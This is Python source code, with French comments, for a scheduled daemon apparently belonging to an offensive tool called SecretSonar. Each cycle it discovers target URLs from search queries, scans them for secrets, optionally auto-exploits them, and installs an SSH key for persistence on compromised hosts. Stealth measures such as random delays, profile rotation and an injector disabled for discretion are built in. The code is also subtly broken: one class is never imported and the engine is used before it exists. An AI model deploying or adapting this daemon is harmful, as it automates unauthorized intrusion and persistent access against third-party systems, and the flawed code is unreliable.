import asyncio, json, os, signal, sys, time, random
from datetime import datetime, timezone
from pathlib import Path
from apscheduler.schedulers.asyncio import AsyncIOScheduler
from apscheduler.triggers.interval import IntervalTrigger
from bxp_secretsonar.discovery.manager import DiscoveryManager
from bxp_secretsonar.core.engine import SecretSonarEngine
from bxp_secretsonar.core.decision import AutonomyLevel

STATE_FILE = "daemon_state.json"

class SecretSonarDaemon:
    def __init__(self, queries_file: str = "queries.txt", interval_hours: int = 12,
                 autonomy_level: int = 0,
                 allow_private: bool = False, output_dir: str = "reports", 
                 auto_exploit: bool = False, auto_persist: bool = False):
        self.queries_file = queries_file
        self.interval_hours = interval_hours
        self.allow_private = allow_private
        self.output_dir = output_dir
        self.auto_exploit = auto_exploit
        self.auto_persist = auto_persist
        self.autonomy_level = autonomy_level
        self.scheduler = AsyncIOScheduler()
        self.engine = None
        self.discovery = DiscoveryManager()
        self._running = False
        os.makedirs(output_dir, exist_ok=True)
        self._load_state()

    def _load_state(self):
        if os.path.exists(STATE_FILE):
            try:
                with open(STATE_FILE, 'r') as f:
                    self.state = json.load(f)
            except:
                self.state = {"runs": [], "sessions": [], "tokens": {}}
        else:
            self.state = {"runs": [], "sessions": [], "tokens": {}}

    def _save_state(self):
        self.state["last_updated"] = datetime.now(timezone.utc).isoformat()
        with open(STATE_FILE, 'w') as f:
            json.dump(self.state, f, indent=2)

    def _load_queries(self):
        if not os.path.exists(self.queries_file):
            return []
        with open(self.queries_file, 'r') as f:
            return [line.strip() for line in f if line.strip() and not line.startswith('#')]

    async def _run_cycle(self):
        """Un cycle complet : découverte, scan, exploitation, persistance."""
        print(f"\n[{datetime.now()}] Début d'un cycle daemon...")
        # Health check TLS au démarrage du daemon
        if self.engine and self.engine.stealth_mgr:
            health = await self.engine.stealth_mgr.health_check()
            print(f"[health] {health}")
        # Rotation de profil furtif pour chaque cycle
        self.engine.stealth_mgr.rotate_profile('smart')
        queries = self._load_queries()
        if not queries:
            print("Aucune requête à exécuter.")
            return

        all_urls = []
        # 1. Découverte
        for query in queries:
            try:
                delay = random.uniform(1, 5)  # furtivité
                await asyncio.sleep(delay)
                urls = await self.discovery.run(query=query, limit=20)
                all_urls.extend(urls)
            except Exception as e:
                print(f"Erreur découverte pour '{query}': {e}")

        if not all_urls:
            print("Aucune URL découverte.")
            return

        # Déduplication
        all_urls = list(set(all_urls))
        random.shuffle(all_urls)  # furtivité

        # 2. Scan + exploitation
        self.engine = SecretSonarEngine()
        self.engine.decision_engine.set_level(AutonomyLevel(self.autonomy_level))
        self.engine.allow_private = self.allow_private
        self.engine.deep_scan = True
        self.engine.injector = None  # Désactivé en mode daemon pour discrétion
        if self.auto_exploit:
            self.engine.framework = ExploitFramework(authorized=True)

        await self.engine.run(all_urls)

        # 3. Sauvegarde des résultats
        report = {
            "cycle_timestamp": datetime.now(timezone.utc).isoformat(),
            "queries": queries,
            "urls_discovered": len(all_urls),
            "validated": len(self.engine._validated_results),
            "confirmed": sum(1 for v in self.engine._validated_results if v.is_confirmed),
            "high_impact": sum(1 for v in self.engine._validated_results if v.impact_score and v.impact_score.composite_score >= 0.6),
        }
        self.state["runs"].append(report)
        self._save_state()

        # 4. Persistance automatique (si activée et sessions disponibles)
        if self.auto_persist and self.engine.framework and self.engine.framework.sessions:
            from bxp_secretsonar.plugins.post_exploit.persist import PersistSSHKey
            for sess in self.engine.framework.sessions:
                if sess.alive and sess.protocol == "ssh":
                    # Utiliser une clé publique par défaut si elle existe
                    pubkey_path = os.path.expanduser("~/.ssh/id_rsa.pub")
                    if os.path.exists(pubkey_path):
                        plugin = PersistSSHKey()
                        result = plugin.run(sess, {"pubkey": pubkey_path})
                        print(f"Persistance SSH sur {sess.target}: {result.get('output', '')}")

        # Sauvegarde du rapport détaillé
        report_path = os.path.join(self.output_dir, f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
        with open(report_path, 'w') as f:
            json.dump(report, f, indent=2)
        print(f"Rapport sauvegardé : {report_path}")

    def start(self):
        """Démarre le planificateur."""
        self._running = True
        self.scheduler.add_job(
            self._run_cycle,
            IntervalTrigger(hours=self.interval_hours),
            id='daemon_cycle',
            replace_existing=True
        )
        # Exécuter un premier cycle immédiatement
        self.scheduler.add_job(
            self._run_cycle,
            'date',
            run_date=datetime.now(),
            id='initial_cycle'
        )
        self.scheduler.start()
        print(f"Daemon démarré (intervalle: {self.interval_hours}h).")
        print(f"Requêtes: {self._load_queries()}")
        print(f"Mode privé: {self.allow_private}, Exploit auto: {self.auto_exploit}, Persist auto: {self.auto_persist}")

        # Boucle principale (maintient le processus en vie)
        try:
            asyncio.get_event_loop().run_forever()
        except KeyboardInterrupt:
            self.stop()

    def stop(self):
        """Arrête proprement le daemon."""
        self._running = False
        self.scheduler.shutdown()
        self._save_state()
        print("\nDaemon arrêté proprement.")

    def status(self):
        """Retourne l'état actuel."""
        jobs = self.scheduler.get_jobs()
        return {
            "running": self._running,
            "interval_hours": self.interval_hours,
            "queries_file": self.queries_file,
            "auto_exploit": self.auto_exploit,
            "auto_persist": self.auto_persist,
            "jobs": [{"id": j.id, "next_run": str(j.next_run_time)} for j in jobs],
            "last_runs": self.state.get("runs", [])[-3:]  # 3 derniers cycles
        }
